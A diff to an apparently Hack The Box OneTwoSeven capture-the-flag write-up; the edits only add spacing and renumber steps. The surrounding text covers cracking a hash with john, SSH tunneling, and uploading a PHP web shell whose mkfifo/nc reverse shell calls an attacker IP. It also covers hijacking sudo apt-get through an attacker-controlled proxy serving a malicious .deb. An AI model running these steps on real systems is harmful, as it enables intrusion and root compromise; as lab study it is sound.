@@ -53,6 +53,7 @@ Crack it with john (pass.hash is file only containing hash)
 john --wordlist=rockyou.txt pass.hash
 ```
 we get password as *Homesweethome1*
+
 ## SSH tunneling
 Further exploring the source code we get a admin login at localhost:60080 of the remote machine.
 Using ssh tunneling to tunnel our localhost:60080 to remote machine localhost:60080
@@ -60,9 +61,11 @@ Using ssh tunneling to tunnel our localhost:60080 to remote machine localhost:60
 ssh -N -L 60080:127.0.0.1:60080 ots-kMjNlZjE@10.10.10.133
 ```
 ~we can do this as sftp is bases on ssh
+
 ## Shell Upload
 We get a login prompt after which we get a menu.php, with several php addons. After some enumeration and reading ots-addon-man, we upload reverse shell as following request.
 ~i use python for creating this request.
+
 ```
 POST /addon-download.php/addon-upload.php HTTP/1.1
 Host: 127.0.0.1:60080
@@ -93,9 +96,11 @@ echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.
 ~I used LinEnum.sh as enumeration script
 As result of command ```sudo -l``` we find that we run apt-get update && apt-get upgrade and change environment variable http_proxy, so apt is our attack vector.
 on internet we find an apt mitm (man in the middle) vuln, so did the following steps.
+
 1. Follow the blog post make the malicious deb file, Package file.
 ~ we will only need these file you can ignore the rest of blog.
-1. Create the repo stucture,
+
+2. Create the repo stucture,
 
 ```
 .:
@@ -129,12 +134,14 @@ vim
 vim_11.1.0875-3_amd64.deb
 ```
 
-1. Make the box proxy to us,
+3. Make the box proxy to us,
 
 ```
 export http_proxy=http://10.10.15.69:3128/
 ```
-1. Proxy to a Proxy 
+
+4. Proxy to a Proxy 
+
 * the box proxies to a proxy on our box, the proxy tunnels locally to port 80.
 ~we doing this so the second proxy uses our /etc/hosts to resolve packages.onetwoseven.htb to 127.0.0.1. 
 * we will use squid to listen on port 3128 (i.e default), which will forward it localhost listening on port 80
@@ -147,10 +154,13 @@ acl GOOD dst 127.0.0.1
 
 ```
 * Run the command to start squid service
+
 ```
 sudo service squid start
 ```
-1. Setting Up Server
+
+5. Setting Up Server
+
 * Edit the /etc/hosts file
 ```
 127.0.0.1 packages.onetwoseven.htb
